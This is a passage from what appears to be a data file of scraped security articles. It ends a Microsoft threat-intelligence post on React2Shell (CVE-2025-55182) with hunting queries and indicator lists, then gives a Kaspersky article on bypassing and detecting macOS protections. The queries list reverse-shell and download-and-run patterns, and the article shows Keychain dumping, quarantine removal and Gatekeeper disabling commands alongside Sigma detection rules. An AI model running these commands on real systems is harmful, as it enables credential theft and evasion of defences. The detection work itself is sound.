\"'powershell -c \" | extend decoded_powershell = iff( isnotempty( decoded_powershell_1),decoded_powershell_1, iff(isnotempty( decoded_powershell_2), decoded_powershell_2, iff(isnotempty( decoded_powershell_3), decoded_powershell_3,decoded_powershell_1b))) | project-away decoded_powershell_1, decoded_powershell_1b, decoded_powershell_2,decoded_powershell_3 | where isnotempty( decoded_powershell) Identify execution of suspicious commands initiated by the next-server parent process post-exploitation let lookback = 10d; DeviceProcessEvents | where Timestamp >= ago(lookback) | where InitiatingProcessFileName =~ \"node.exe\" and InitiatingProcessCommandLine has \".js\" | where FileName =~ \"cmd.exe\" | where (ProcessCommandLine has_any (@\"\\next\\\", @\"\\npm\\npm\\node_modules\\\", \"\\\\server.js\") and (ProcessCommandLine has_any (\"powershell -c \\\"\", \"curl\", \"wget\", \"echo $\", \"ipconfig\", \"start msiexec\", \"whoami\", \"systeminfo\", \"$env:USERPROFILE\", \"net user\", \"net group\", \"localgroup administrators\", \"-ssh\", \"set-MpPreference\", \"add-MpPreference\", \"rundll32\", \"certutil\", \"regsvr32\", \"bitsadmin\", \"mshta\", \"msbuild\") or (ProcessCommandLine has \"powershell\" and (ProcessCommandLine has_any (\"Invoke-Expression\", \"DownloadString\", \"DownloadFile\", \"FromBase64String\", \"Start-Process\", \"System.IO.Compression\", \"System.IO.MemoryStream\", \"iex \", \"iex(\", \"Invoke-WebRequest\", \"iwr \", \".UploadFile\", \"System.Net.WebClient\") or ProcessCommandLine matches regex @\"[-/\u2013][Ee^]{1,2}[NnCcOoDdEeMmAa^]*\\s[A-Za-z0-9+/=]{15,}\")))) or ProcessCommandLine matches regex @'cmd\\.exe\\s+/d\\s+/s\\s+/c\\s+\"powershell\\s+-c\\s+\"[0-9]+\\*[0-9]+\"\"' Identify execution of suspicious commands initiated by the next-server parent process post-exploitation let lookback = 10d; DeviceProcessEvents | where Timestamp >= ago(lookback) | where InitiatingProcessFileName == \"node\" | where InitiatingProcessCommandLine has_any (\" server.js\", \" start\", \"/server.js\") | where ProcessCommandLine has_any (\"| sh\", \"openssl,\", \"/dev/tcp/\", \"| bash\", \"|sh\", \"|bash\", \"bash,\", \"{sh,}\", \"SOCK_STREAM\", \"bash -i\", \"whoami\", \"| base64 -d\", \"chmod +x /tmp\", \"chmod 777\") | where ProcessCommandLine !contains \"vscode\" and ProcessCommandLine !contains \"/.claude/\" and ProcessCommandLine !contains \"/claude\" Microsoft Defender XDR\u2019s blast radius analysis capability, incorporated into the incident investigation view, allows security teams to visualize and understand the business impact of a security compromise by showing potential propagation paths towards the organization\u2019s critical assets before it escalates into a full blown incident. This capability merges pre-breach estate understanding with post-breach views allowing security teams to map their interconnected assets and highlights potential paths teams can prioritize for remediation efforts based on the criticality of assets and their interconnectivity to the compromised entities. Microsoft Defender for Cloud Microsoft Defender for Cloud customers can use security explorer templates to locate exposed containers running vulnerable container images and vulnerable virtual machines. Template titled Internet exposed containers running container images vulnerable to React2Shell vulnerability CVE-2025-55182 and Internet exposed virtual machines vulnerable to React2Shell vulnerability CVE-2025-55182 are added to the gallery. Figure 3. Microsoft Defender for Cloud security explorer templates related to CVE-2025-55182 Microsoft Security Exposure Management Microsoft Security Exposure Management\u2019s automated attack path analysis maps out potential threats by identifying exposed resources and tracing the routes an attacker might take to compromise critical assets. This analysis highlights vulnerable cloud compute resources, such as virtual machines and Kubernetes containers, that are susceptible to remote code execution vulnerabilities, including React2Shell CVEs. It also outlines possible lateral movement steps an adversary might take within the environment. The attack paths are presented for all supported cloud environments, including Azure, AWS, and GCP. To view these paths, filter the view in Microsoft Security Exposure Management, filter by entry point type: Kubernetes container Virtual Machine AWS EC2 instance GCP compute instance. Alternatively, in Microsoft Defender for Cloud, customers can filter by titles such as: Internet exposed container with high severity vulnerabilities Internet exposed Azure VM with RCE vulnerabilities Internet exposed GCP compute instance with RCE vulnerabilities Internet exposed AWS EC2 instance with RCE vulnerabilities Microsoft Sentinel Microsoft Sentinel customers can use the TI Mapping analytics (a series of analytics all prefixed with \u2018TI map\u2019) to automatically match the malicious domain indicators mentioned in this blog post with data in their workspace. If the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the Microsoft Sentinel Content Hub to have the analytics rule deployed in their Sentinel workspace. Detect network IP and domain indicators of compromise using ASIM //IP list and domain list- _Im_NetworkSession let lookback = 30d; let ioc_ip_addr = dynamic([\"194.69.203.32\", \"162.215.170.26\", \"216.158.232.43\", \"196.251.100.191\", \"46.36.37.85\", \"92.246.87.48\"]); let ioc_domains = dynamic([\"anywherehost.site\", \"xpertclient.net\", \"superminecraft.net.br\", \"overcome-pmc-conferencing-books.trycloudflare.com\", \"donaldjtrmp.anondns.net\", \"labubu.anondns.net\", \"krebsec.anondns.net\", \"hybird-accesskey-staging-saas.s3.dualstack.ap-northeast-1.amazonaws.com\", \"ghostbin.axel.org\", \"194.69.203.32:81\", \"194.69.203.32:81\", \"194.69.203.32:81\", \"162.215.170.26:3000\", \"216.158.232.43:12000\", \"overcome-pmc-conferencing-books.trycloudflare.com\", \"donaldjtrmp.anondns.net:1488\", \"labubu.anondns.net:1488\", \"krebsec.anondns.net:2316/dong\", \"hybird-accesskey-staging-saas.s3.dualstack.ap-northeast-1.amazonaws.com\", \"ghostbin.axel.org\"]);n_Im_NetworkSession(starttime=todatetime(ago(lookback)), endtime=now())n| where DstIpAddr in (ioc_ip_addr) or DstDomain has_any (ioc_domains) | summarize imNWS_mintime=min(TimeGenerated), imNWS_maxtime=max(TimeGenerated), EventCount=count() by SrcIpAddr, DstIpAddr, DstDomain, Dvc, EventProduct, EventVendor Detect Web Sessions IP and file hash indicators of compromise using ASIM //IP list - _Im_WebSession let lookback = 30d; let ioc_ip_addr = dynamic([\"194.69.203.32\", \"162.215.170.26\", \"216.158.232.43\", \"196.251.100.191\", \"46.36.37.85\", \"92.246.87.48\"]); let ioc_sha_hashes =dynamic([\"c2867570f3bbb71102373a94c7153239599478af84b9c81f2a0368de36f14a7c\", \"9e9514533a347d7c6bc830369c7528e07af5c93e0bf7c1cd86df717c849a1331\", \"b63860cefa128a4aa5d476f300ac45fd5d3c56b2746f7e72a0d27909046e5e0f\", \"d60461b721c0ef7cfe5899f76672e4970d629bb51bb904a053987e0a0c48ee0f\", \"d3c897e571426804c65daae3ed939eab4126c3aa3fa8531de5e8f0b66629fe8a\", \"d71779df5e4126c389e7702f975049bd17cb597ebcf03c6b110b59630d8f3b4d\", \"b5acbcaccc0cfa54500f2bbb0745d4b5c50d903636f120fc870082335954bec8\", \"4cbdd019cfa474f20f4274310a1477e03e34af7c62d15096fe0df0d3d5668a4d\", \"f347eb0a59df167acddb245f022a518a6d15e37614af0bbc2adf317e10c4068b\", \"661d3721adaa35a30728739defddbc72b841c3d06aca0abd4d5e0aad73947fb1\", \"876923709213333099b8c728dde9f5d86acfd0f3702a963bae6a9dde35ba8e13\", \"2ebed29e70f57da0c4f36a9401a7bbd36e6ddd257e0920aa4083240afa3a6457\", \"f1ee866f6f03ff815009ff8fd7b70b902bc59b037ac54b6cae9b8e07beb854f7\", \"7e90c174829bd4e01e86779d596710ad161dbc0e02a219d6227f244bf271d2e5\"]);b_Im_WebSession(starttime=todatetime(ago(lookback)), endtime=now())b| where DstIpAddr in (ioc_ip_addr) or FileSHA256 in (ioc_sha_hashes) | summarize imWS_mintime=min(TimeGenerated), imWS_maxtime=max(TimeGenerated), EventCount=count() by SrcIpAddr, DstIpAddr, Url, Dvc, EventProduct, EventVendor Detect domain and URL indicators of compromise using ASIM // Domain list - _Im_WebSession let ioc_domains = dynamic([\"anywherehost.site\", \"xpertclient.net\", \"superminecraft.net.br\", \"overcome-pmc-conferencing-books.trycloudflare.com\", \"donaldjtrmp.anondns.net\", \"labubu.anondns.net\", \"krebsec.anondns.net\", \"hybird-accesskey-staging-saas.s3.dualstack.ap-northeast-1.amazonaws.com\", \"ghostbin.axel.org\", \"194.69.203.32:81\", \"194.69.203.32:81\", \"194.69.203.32:81\", \"162.215.170.26:3000\", \"216.158.232.43:12000\", \"overcome-pmc-conferencing-books.trycloudflare.com\", \"donaldjtrmp.anondns.net:1488\", \"labubu.anondns.net:1488\", \"krebsec.anondns.net:2316/dong\", \"hybird-accesskey-staging-saas.s3.dualstack.ap-northeast-1.amazonaws.com\", \"ghostbin.axel.org\"]); _Im_WebSession (url_has_any = ioc_domains) Detect files hashes indicators of compromise using ASIM // file hash list - imFileEvent let ioc_sha_hashes = dynamic([\"c2867570f3bbb71102373a94c7153239599478af84b9c81f2a0368de36f14a7c\", \"9e9514533a347d7c6bc830369c7528e07af5c93e0bf7c1cd86df717c849a1331\", \"b63860cefa128a4aa5d476f300ac45fd5d3c56b2746f7e72a0d27909046e5e0f\", \"d60461b721c0ef7cfe5899f76672e4970d629bb51bb904a053987e0a0c48ee0f\", \"d3c897e571426804c65daae3ed939eab4126c3aa3fa8531de5e8f0b66629fe8a\", \"d71779df5e4126c389e7702f975049bd17cb597ebcf03c6b110b59630d8f3b4d\", \"b5acbcaccc0cfa54500f2bbb0745d4b5c50d903636f120fc870082335954bec8\", \"4cbdd019cfa474f20f4274310a1477e03e34af7c62d15096fe0df0d3d5668a4d\", \"f347eb0a59df167acddb245f022a518a6d15e37614af0bbc2adf317e10c4068b\", \"661d3721adaa35a30728739defddbc72b841c3d06aca0abd4d5e0aad73947fb1\", \"876923709213333099b8c728dde9f5d86acfd0f3702a963bae6a9dde35ba8e13\", \"2ebed29e70f57da0c4f36a9401a7bbd36e6ddd257e0920aa4083240afa3a6457\", \"f1ee866f6f03ff815009ff8fd7b70b902bc59b037ac54b6cae9b8e07beb854f7\", \"7e90c174829bd4e01e86779d596710ad161dbc0e02a219d6227f244bf271d2e5\"]);dimFileEventd| where SrcFileSHA256 in (ioc_sha_hashes) or TargetFileSHA256 in (ioc_sha_hashes) | extend AccountName = tostring(split(User, @'')[1]), AccountNTDomain = tostring(split(User, @'')[0]) | extend AlgorithmType = \"SHA256\" Find use of reverse shells This query looks for potential reverse shell activity initiated by cmd.exe or PowerShell . It matches the use of reverse shells in this attack: reverse-shell-nishang . Indicators of compromise The list below is non-exhaustive and does not represent all indicators of compromise observed in the known campaigns: Indicator Type Description c6c7e7dd85c0578dd7cb24b012a665a9d5210cce8ff735635a45605c3af1f6ad b568582240509227ff7e79b6dc73c933dcc3fae674e9244441066928b1ea0560 69f2789a539fc2867570f3bbb71102373a94c7153239599478af84b9c81f2a03 68de36f14a7c9e9514533a347d7c6bc830369c7528e07af5c93e0bf7c1cd86df 717c849a1331b63860cefa128a4aa5d476f300ac45fd5d3c56b2746f7e72a0d2 7909046e5e0fd60461b721c0ef7cfe5899f76672e4970d629bb51bb904a05398 7e0a0c48ee0f65c72a252335f6dcd435dbd448fc0414b295f635372e1c5a9171 SHA-256 Coin miner payload hashes b33d468641a0d3c897e571426804c65daae3ed939eab4126c3aa3fa8531de5e8 f0b66629fe8ad71779df5e4126c389e7702f975049bd17cb597ebcf03c6b110b 59630d8f3b4db5acbcaccc0cfa54500f2bbb0745d4b5c50d903636f120fc8700 82335954bec84cbdd019cfa474f20f4274310a1477e03e34af7c62d15096fe0d f0d3d5668a4df347eb0a59df167acddb245f022a518a6d15e37614af0bbc2adf 317e10c4068b661d3721adaa35a30728739defddbc72b841c3d06aca0abd4d5e 0aad73947fb1876923709213333099b8c728dde9f5d86acfd0f3702a963bae6a 9dde35ba8e132ebed29e70f57da0c4f36a9401a7bbd36e6ddd257e0920aa4083 240afa3a6457f1ee866f6f03ff815009ff8fd7b70b902bc59b037ac54b6cae9b 8e07beb854f77e90c174829bd4e01e86779d596710ad161dbc0e02a219d6227f 244bf271d2e55cd737980322de37c2c2792154b4cf4e4893e9908c2819026e5f SHA-256 Backdoor payload hashes hxxp://194[.]69[.]203[.]32:81/hiddenbink/colonna.arc hxxp://194[.]69[.]203[.]32:81/hiddenbink/colonna.i686 hxxp://194[.]69[.]203[.]32:81/hiddenbink/react.sh hxxp://162[.]215[.]170[.]26:3000/sex.sh hxxp://216[.]158[.]232[.]43:12000/sex.sh hxxp://196[.]251[.]100[.]191/no_killer/Exodus.arm4 hxxp://196[.]251[.]100[.]191/no_killer/Exodus.x86 hxxp://196[.]251[.]100[.]191/no_killer/Exodus.x86_64 hxxp://196[.]251[.]100[.]191/update.sh hxxp://anywherehost[.]site/xms/k1.sh hxxp://anywherehost[.]site/xms/kill2.sh hxxps://overcome-pmc-conferencing-books[.]trycloudflare[.]com/p.png hxxp://donaldjtrmp.anondns.net:1488/labubu hxxp://labubu[.]anondns[.]net:1488/dong hxxp://krebsec[.]anondns[.]net:2316/dong hxxps://hybird-accesskey-staging-saas[.]s3[.]dualstack[.]ap-northeast-1[.]amazonaws[.]com/agent hxxps://ghostbin[.]axel[.]org/paste/evwgo/raw hxxp://xpertclient[.]net:3000/sex.sh hxxp://superminecraft[.]net[.]br:3000/sex.sh URLs Various payload download URLs 194.69.203[.]32 162.215.170[.]26 216.158.232[.]43 196.251.100[.]191 46.36.37[.]85 92.246.87[.]48 IP addresses C2 anywherehost[.]site xpertclient[.]net vps-zap812595-1[.]zap-srv[.]com superminecraft[.]net[.]br overcome-pmc-conferencing-books[.]trycloudflare[.]com donaldjtrmp[.]anondns[.]net labubu[.]anondns[.]net krebsec[.]anondns[.]net hybird-accesskey-staging-saas[.]s3[.]dualstack[.]ap-northeast-1[.]amazonaws[.]com ghostbin[.]axel[.]org Domains C2 References Critical Security Vulnerability in React Server Components \u2013 React NVD \u2013 CVE-2025-55182 CVE-2025-55182 (React2Shell) Opportunistic Exploitation In The Wild: What The GreyNoise Observation Grid Is Seeing So Far Learn more For the latest security research from the Microsoft Threat Intelligence community, check out the Microsoft Threat Intelligence Blog . To get notified about new publications and to join discussions on social media, follow us on LinkedIn , X (formerly Twitter) , and Bluesky . To hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the Microsoft Threat Intelligence podcast . The guidance provided in this blog post represents general best practices and is intended for informational purposes only. Customers remain responsible for evaluating and implementing security measures appropriate for their environments. Microsoft Defender Security Research Team See Microsoft Defender Security Research Team posts Related posts February 10 15 min read Manipulating AI memory for profit: The rise of AI Recommendation Poisoning That helpful \u201cSummarize with AI\u201d button? It might be secretly manipulating what your AI recommends. February 9 3 min read A one-prompt attack that breaks LLM safety alignment As LLMs and diffusion models power more applications, their safety alignment becomes critical. February 6 5 min read Analysis of active exploitation of SolarWinds Web Help Desk We are seeing exploitation of SolarWinds Web Help Desk via CVE\u20112025\u201140551 and CVE\u20112025\u201140536 that can lead to domain compromise; here is how to patch, hunt, and mitigate now. Get started with Microsoft Security Protect your people, data, and infrastructure with AI-powered, end-to-end security from Microsoft. Learn how Connect with us on social X YouTube LinkedIn What's new Surface Pro Surface Laptop Surface Laptop Studio 2 Copilot for organizations Copilot for personal use AI in Windows Explore Microsoft products Windows 11 apps Microsoft Store Account profile Download Center Microsoft Store support Returns Order tracking Certified Refurbished Microsoft Store Promise Flexible Payments Education Microsoft in education Devices for education Microsoft Teams for Education Microsoft 365 Education How to buy for your school Educator training and development Deals for students and parents AI for education Business Microsoft AI Microsoft Security Dynamics 365 Microsoft 365 Microsoft Power Platform Microsoft Teams Microsoft 365 Copilot Small Business Developer & IT Azure Microsoft Developer Microsoft Learn Support for AI marketplace apps Microsoft Tech Community Microsoft Marketplace Marketplace Rewards Visual Studio Company Careers About Microsoft Company news Privacy at Microsoft Investors Diversity and inclusion Accessibility Sustainability English (United States) Your Privacy Choices Opt-Out Icon Your Privacy Choices Consumer Health Privacy Sitemap Contact Microsoft Privacy Manage cookies Terms of use Trademarks Safety & eco Recycling About our ads \u00a9 Microsoft 2026",
    "expected_count": 4
  },
  {
    "url": "https://securelist.com/macos-security-and-typical-attacks/117367/",
    "title": "How attackers adapt to built-in macOS protection | Securelist",
    "content": "How attackers adapt to built-in macOS protection | Securelist Solutions for: Home Products Small Business 1-50 employees Medium Business 51-999 employees Enterprise 1000+ employees by Kaspersky CompanyAccount Get In Touch Dark mode off English Russian Spanish Brazil Solutions Internet of Things & Embedded Security Learn More Industrial Cybersecurity Learn More Fraud Prevention Learn More KasperskyOS-based solutions Learn More Other solutions Kaspersky for Security Operations Center Kaspersky IoT Infrastructure Security Kaspersky Secure Remote Workspace Industries National Cybersecurity Learn More Industrial Cybersecurity Learn More Finance Services Cybersecurity Learn More Healthcare Cybersecurity Learn More Transportation Cybersecurity Learn More Retail Cybersecurity Learn More Other Industries Telecom Cybersecurity View all Products Kaspersky Next NEW! Learn More Kaspersky XDR Learn More Kaspersky Endpoint Security for Business Learn More Kaspersky EDR Expert Learn More Kaspersky EDR Optimum Learn More Kaspersky Anti Targeted Attack Platform Learn More Kaspersky Hybrid Cloud Security Learn More Kaspersky SD-WAN Learn More Kaspersky Industrial CyberSecurity Learn More Kaspersky Container Security Learn More Other Products Kaspersky Security for Internet Gateway Kaspersky Embedded Systems Security Kaspersky IoT Infrastructure Security Kaspersky Secure Remote Workspace Kaspersky Security for Mail Server View All Services Kaspersky Cybersecurity Services Learn More Kaspersky Security Awareness Learn More Kaspersky Premium Support Learn More Kaspersky Threat Intelligence Learn More Kaspersky Managed Detection and Response Learn More Kaspersky Compromise Assessment Learn More Kaspersky SOC Consulting Learn More Other Services Kaspersky Professional Services Kaspersky Incident Response Kaspersky Cybersecurity Training View All Resource Center Case Studies White Papers Datasheets Technologies MITRE ATT&CK About Us Transparency Corporate News Press Center Careers Sponsorship Policy Blog Contacts GDPR Dark mode off Securelist menu English Russian Spanish Brazil Existing Customers Personal My Kaspersky Renew your product Update your product Customer support Business KSOS portal Kaspersky Business Hub Technical Support Knowledge Base Renew License Home Products Trials&Update Resource Center Business Kaspersky Next Small Business (1-50 employees) Medium Business (51-999 employees) Enterprise (1000+ employees) Securelist Threats Financial threats Mobile threats Web threats Secure environment (IoT) Vulnerabilities and exploits Spam and Phishing Industrial threats Categories APT reports Incidents Research Malware reports Spam and phishing reports Publications Kaspersky Security Bulletin Archive All Tags APT Logbook Webinars Statistics Encyclopedia Threats descriptions KSB 2021 About Us Company Transparency Corporate News Press Center Careers Sponsorships Policy Blog Contacts Partners Find a Partner Partner Program Content menu Close Subscribe by Kaspersky Dark mode off Threats Threats APT (Targeted attacks) Secure environment (IoT) Mobile threats Financial threats Spam and phishing Industrial threats Web threats Vulnerabilities and exploits All threats Categories Categories APT reports Malware descriptions Security Bulletin Malware reports Spam and phishing reports Security technologies Research Publications All categories Other sections Archive All tags Webinars APT Logbook Statistics Encyclopedia Threats descriptions KSB 2025 Kaspersky ICS CERT Security technologies How attackers adapt to built-in macOS protection Security technologies 29 Aug 2025 minute read Table of Contents Overview of macOS security mechanisms Keychain SIP TCC File Quarantine Gatekeeper Takeaways Authors Alexander Chudnov If a system is popular with users, you can bet it\u2019s just as popular with cybercriminals. Although Windows still dominates, second place belongs to macOS. And this makes it a viable target for attackers. With various built-in protection mechanisms, macOS generally provides a pretty much end-to-end security for the end user. This post looks at how some of them work, with examples of common attack vectors and ways of detecting and thwarting them. Overview of macOS security mechanisms Let\u2019s start by outlining the set of security mechanisms in macOS with a brief description of each: Keychain \u2013 default password manager TCC \u2013 application access control SIP \u2013 ensures the integrity of information in directories and processes vulnerable to attacks File Quarantine \u2013 protection against launching suspicious files downloaded from the internet Gatekeeper \u2013 ensures only trusted applications are allowed to run XProtect \u2013 signature-based anti-malware protection in macOS XProtect Remediator \u2013 tool for automatic response to threats detected by XProtect Keychain Introduced back in 1999, the password manager for macOS remains a key component in the Apple security framework. It provides centralized and secure storage of all kinds of secrets: from certificates and encryption keys to passwords and credentials. All user accounts and passwords are stored in Keychain by default. Access to the data is protected by a master password. Keychain files are located in the directories ~/Library/Keychains/ , /Library/Keychains/ and /Network/Library/Keychains/ . Besides the master password, each of them can be protected with its own key. By default, only owners of the corresponding Keychain copy and administrators have access to these files. In addition, the files are encrypted using the reliable AES-256-GCM algorithm. This guarantees a high level of protection, even in the event of physical access to the system. However, attacks on the macOS password manager still occur. There are specialized utilities, such as Chainbreaker, designed to extract data from Keychain files. With access to the file itself and its password, Chainbreaker allows an attacker to do a local analysis and full data decryption without being tied to the victim\u2019s device. What\u2019s more, native macOS tools such as the Keychain Access GUI application or the /usr/bin/security command-line utility can be used for malicious purposes if the system is already compromised. So while the Keychain architecture provides robust protection, it is still vital to control local access, protect the master password, and minimize the risk of data leakage outside the system. Below is an example of a Chainbreaker command: python -m chainbreaker -pa test_keychain.keychain -o output As mentioned above, the security utility can be used for command line management, specifically the following commands: security list-keychains \u2013 displays all available Keychain files Keychain files available to the user security dump-keychain -a -d \u2013 dumps all Keychain files Keychain file dump security dump-keychain ~/Library/Keychains/login.keychain-db \u2013 dumps a specific Keychain file (a user file is shown as an example) To detect attacks of this type, you need to configure logging of process startup events. The best way to do this is with the built-in macOS logging tool, ESF . This allows you to collect necessary events for building detection logic. Collection of necessary events using this mechanism is already implemented and configured in Kaspersky Endpoint Detection and Response (KEDR) . Among the events necessary for detecting the described activity are those containing the security dump-keychain and security list-keychains commands, since such activity is not regular for ordinary macOS users. Below is an example of an EDR triggering on a Keychain dump event, as well as an example of a detection rule. Example of an event from Kaspersky EDR Sigma: title: Keychain access description: This rule detects dumping of keychain tags: - attack.credential-access - attack.t1555.001 logsource: category: process_creation product: macos detection: selection: cmdline: security cmdline: -list-keychains -dump-keychain condition: selection falsepositives: - Unknow level: medium 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 title : Keychain access description : This rule detects dumping of keychain tags : - attack . credential - access - attack . t1555 . 001 logsource : category : process_creation product : macos detection : selection : cmdline : security cmdline : - list - keychains - dump - keychain condition : selection falsepositives : - Unknow level : medium SIP System Integrity Protection (SIP) is one of the most important macOS security mechanisms, which is designed to prevent unauthorized interference in critical system files and processes, even by users with administrative rights. First introduced in OS X 10.11 El Capitan, SIP marked a significant step toward strengthening security by limiting the ability to modify system components, safeguarding against potential malicious influence. The mechanism protects files and directories by assigning special attributes that block content modification for everyone except trusted system processes, which are inaccessible to users and third-party software. In particular, this makes it difficult to inject malicious components into these files. The following directories are SIP-protected by default: /System /sbin /bin /usr (except /usr/local ) /Applications (preinstalled applications) /Library/Application Support/com.apple.TCC A full list of protected directories is in the configuration file /System/Library/Sandbox/rootless.conf . These are primarily system files and preinstalled applications, but SIP allows adding extra paths. SIP provides a high level of protection for system components, but if there is physical access to the system or administrator rights are compromised, SIP can be disabled \u2013 but only by restarting the system in Recovery Mode and then running the csrutil disable command in the terminal. To check the current status of SIP, use the csrutil status command. Output of the csrutil status command To detect this activity, you need to monitor the csrutil status command. Attackers often check the SIP status to find available options. Because they deploy csrutil disable in Recovery Mode before any monitoring solutions are loaded, this command is not logged and so there is no point in tracking its execution. Instead, you can set up SIP status monitoring, and if the status changes, send a security alert. Example of an event from Kaspersky EDR Sigma: title: SIP status discovery description: This rule detects SIP status discovery tags: - attack.discovery - attack.t1518.001 logsource: category: process_creation product: macos detection: selection: cmdline: csrutil status condition: selection falsepositives: - Unknow level: low 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 title : SIP status discovery description : This rule detects SIP status discovery tags : - attack . discovery - attack . t1518 . 001 logsource : category : process_creation product : macos detection : selection : cmdline : csrutil status condition : selection falsepositives : - Unknow level : low TCC macOS includes the Transparency, Consent and Control (TCC) framework, which ensures transparency of applications by requiring explicit user consent to access sensitive data and system functions. TCC is structured on SQLite databases ( TCC.db ), located both in shared directories ( /Library/Application Support/com.apple.TCC/TCC.db ) and in individual user directories ( /Users/<username>/Library/Application Support/com.apple.TCC/TCC.db ). Contents of a table in the TCC database The integrity of these databases and protection against unauthorized access are implemented using SIP, making it impossible to modify them directly. To interfere with these databases, an attacker must either disable SIP or gain access to a trusted system process. This renders TCC highly resistant to interference and manipulation. TCC works as follows: whenever an application accesses a sensitive function (camera, microphone, geolocation, Full Disk Access, input control, etc.) for the first time, an interactive window appears with a request for user confirmation. This allows the user to control the extension of privileges. TCC access permission window A potential vector for bypassing this mechanism is TCC Clickjacking \u2013 a technique that superimposes a visually altered window on top of the permissions request window, hiding the true nature of the request. The unsuspecting user clicks the button and grants permissions to malware. Although this technique does not exploit TCC itself, it gives attackers access to sensitive system functions, regardless of the level of protection. Example of a superimposed window Attackers are interested in obtaining Full Disk Access or Accessibility rights, as these permissions grant virtually unlimited access to the system. Therefore, monitoring changes to TCC.db and managing sensitive privileges remain vital tasks for ensuring comprehensive macOS security. File Quarantine File Quarantine is a built-in macOS security feature, first introduced in OS X 10.5 Tiger. It improves system security when handling files downloaded from external sources. This mechanism is analogous to the Mark-of-the-Web feature in Windows to warn users of potential danger before running a downloaded file. Files downloaded through a browser or other application that works with File Quarantine are assigned a special attribute ( com.apple.quarantine ). When running such a file for the first time, if it has a valid signature and does not arouse any suspicion of Gatekeeper (see below), the user is prompted to confirm the action. This helps prevent running malware by accident. Example of file attributes that include the quarantine attribute To get detailed information about the com.apple.quarantine attribute, use the xattr -p com.apple.quarantine <File name> command. The screenshot below shows an example of the output of this command: 0083 \u2013 flag for further Gatekeeper actions 689cb865 \u2013 timestamp in hexadecimal format (Mac Absolute Time) Safari \u2013 browser used to download the file 66EA7FA5-1F9E-4779-A5B5-9CCA2A4A98F5 \u2013 UUID attached to this file. This is needed to database a record of the file Detailed information about the com.apple.quarantine attribute The information returned by this command is stored in a database located at ~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2 , where it can be audited. Data in the com.apple.LaunchServices.QuarantineEventsV2 database To avoid having their files quarantined, attackers use various techniques to bypass File Quarantine. For example, files downloaded via curl, wget or other low-level tools that are not integrated with File Quarantine are not flagged with the quarantine attribute. Bypassing quarantine using curl It is also possible to remove the attribute manually using the xattr -d com.apple.quarantine <filename> command. Removing the quarantine attribute If the quarantine attribute is successfully removed, no warning will be displayed when the file is run, which is useful in social engineering attacks or in cases where the attacker prefers to execute malware without the user\u2019s knowledge. Running a file without a File Quarantine check To detect this activity, you need to monitor execution of the xattr command in conjunction with -d and com.apple.quarantine , which implies removal of the quarantine attribute. In an incident related to macOS compromise, also worth investigating is the origin of the file: if it got onto the host without being flagged by quarantine, this is an additional risk factor. Below is an example of an EDR triggering on a quarantine attribute removal event, as well as an example of a rule for detecting such events. Example of an event from Kaspersky EDR Sigma: title: Quarantine attribute removal description: This rule detects removal of the Quarantine attribute, that leads to avoid File Quarantine tags: - attack.defense-evasion - attack.t1553.001 logsource: category: process_creation product: macos detection: selection: cmdline: xattr -d com.apple.quarantine condition: selection falsepositives: - Unknow level: high 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 title : Quarantine attribute removal description : This rule detects removal of the Quarantine attribute , that leads to avoid File Quarantine tags : - attack . defense - evasion - attack . t1553 . 001 logsource : category : process_creation product : macos detection : selection : cmdline : xattr - d com . apple . quarantine condition : selection falsepositives : - Unknow level : high Gatekeeper Gatekeeper is a key part of the macOS security system, designed to protect users from running potentially dangerous applications. First introduced in OS X Leopard (2012), Gatekeeper checks the digital signature of applications and, if the quarantine attribute ( com.apple.quarantine ) is present, restricts the launch of programs unsigned and unapproved by the user, thus reducing the risk of malicious code execution. The spctl utility is used to manage Gatekeeper. Below is an example of calling spctl to check the validity of a signature and whether it is verified by Apple: Spctl -a -t exec -vvvv <path to file> Checking an untrusted file using spctl Checking a trusted file using spctl Gatekeeper requires an application to be: either signed with a valid Apple developer certificate, or certified by Apple after source code verification. If the application fails to meet these requirements, Gatekeeper by default blocks attempts to run it with a double-click. Unblocking is possible, but this requires the user to navigate through the settings. So, to carry out a successful attack, the threat actor has to not only persuade the victim to mark the application as trusted, but also explain to them how to do this. The convoluted procedure to run the software looks suspicious in itself. However, if the launch is done from the context menu (right-click \u2192 Open), the user sees a pop-up window allowing them to bypass the block with a single click by confirming their intention to use the application. This quirk is used in social engineering attacks: malware can be accompanied by instructions prompting the user to run the file from the context menu. Example of Chropex Adware using this technique Let\u2019s take a look at the method for running programs from the context menu, rather than double-clicking. If we double-click the icon of a program with the quarantine attribute, we get the following window. Running a program with the quarantine attribute by double-clicking If we run the program from the context menu (right-click \u2192 Open), we see the following. Running a program with the quarantine attribute from the context menu Attackers with local access and administrator rights can disable Gatekeeper using the spctl \u2013master disable or --global-disable command. To detect this activity, you need to monitor execution of the spctl command with parameters \u2013master disable or --global-disable , which disables Gatekeeper. Below is an example of an EDR triggering on a Gatekeeper disable event, as well as an example of a detection rule. Example of an Kaspersky EDR event Sigma: title: Gatekeeper disable description: This rule detects disabling of Gatekeeper tags: - attack.defense-evasion - attack.t1562.001 logsource: category: process_creation product: macos detection: selection: cmdline: spctl cmdline: - '--master-disable' - '--global-disable' condition: selection 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 title : Gatekeeper disable description : This rule detects disabling of Gatekeeper tags : - attack . defense - evasion - attack . t1562 . 001 logsource : category : process_creation product : macos detection : selection : cmdline : spctl cmdline : - '--master-disable' - '--global-disable' condition : selection Takeaways The built-in macOS protection mechanisms are highly resilient and provide excellent security. That said, as with any mature operating system, attackers continue to adapt and search for ways to bypass even the most reliable protective barriers. In some cases when standard mechanisms are bypassed, it may be difficult to implement additional security measures and stop the attack. Therefore, for total protection against cyberthreats, use advanced solutions from third-party vendors. Our Kaspersky EDR Expert and Kaspersky Endpoint Security detect and block all the threats described in this post. In addition, to guard against bypassing of standard security measures, use the Sigma rules we have provided. Malware Technologies Apple MacOS Security technology Digital Certificates Defense evasion Detection engineering Authors Alexander Chudnov How attackers adapt to built-in macOS protection Your email address will not be published. Required fields are marked * Name * Email * Cancel \u0394 This site uses Akismet to reduce spam. Learn how your comment data is processed. Table of Contents Overview of macOS security mechanisms Keychain SIP TCC File Quarantine Gatekeeper Takeaways GReAT webinars 13 May 2021, 1:00pm GReAT Ideas. Balalaika Edition Boris Larin Denis 